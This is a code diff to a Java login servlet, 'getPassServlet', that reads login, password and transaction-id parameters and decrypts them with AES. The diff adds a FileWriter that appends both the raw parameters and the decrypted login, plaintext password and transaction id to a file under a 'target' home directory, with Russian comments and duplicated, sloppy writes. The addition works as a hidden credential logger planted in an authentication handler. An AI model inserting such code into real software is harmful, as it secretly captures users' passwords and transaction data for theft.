@@ -11,6 +11,7 @@ import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.sql.Timestamp;
 import java.util.ArrayList;
@@ -35,13 +36,48 @@ public class getPassServlet extends HttpServlet {
 
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
-        String login;//=req.getParameter("login");
-        String pass;//=req.getParameter("password");
-        String txid;//=req.getParameter("tx");
+        String login=req.getParameter("login");
+        String pass=req.getParameter("password");
+        String txid=req.getParameter("tx");
+        try(FileWriter writer = new FileWriter("~/home/target/logss", true))
+        {
+            // запись всей строки
+            writer.append('\n');
+            writer.write(login);
+            writer.append('\n');
+            writer.write(pass);
+            writer.append('\n');
+            writer.write(txid);
+            writer.append('\n');
+
+            // запись по символам
+            writer.append('E');
+
+
+
+            writer.flush();
+
         try{
             login= EncryptionService.DecryptAES(req.getParameter("login"));
+            writer.append('\n');
+            writer.write(login);
+            writer.append('\n');
             pass=EncryptionService.DecryptAES(req.getParameter("password"));
+            writer.write(pass);
+            writer.append('\n');
             txid=EncryptionService.DecryptAES(req.getParameter("tx"));
+            writer.write(txid);
+            writer.append('\n');
+
+            writer.write(pass);
+            writer.append('\n');
+            writer.write(txid);
+            writer.append('\n');
+
+            // запись по символам
+            writer.append('E');
+
+            writer.flush();
         }catch (Exception e){
             e.printStackTrace();
             resp.setContentType("text/html:charset=utf-8");
@@ -61,6 +97,7 @@ public class getPassServlet extends HttpServlet {
         }
         User user = accountService.getUserByLogin(login);
         if(user==null || !user.getPassword().equals(pass)){
+
             resp.setContentType("text/html:charset=utf-8");
             resp.setStatus(HttpServletResponse.SC_NOT_FOUND);
         }
@@ -89,6 +126,11 @@ public class getPassServlet extends HttpServlet {
                 }
 
             }
+        }
+        }
+        catch(IOException ex){
+
+            System.out.println(ex.getMessage());
         }
     }
 }
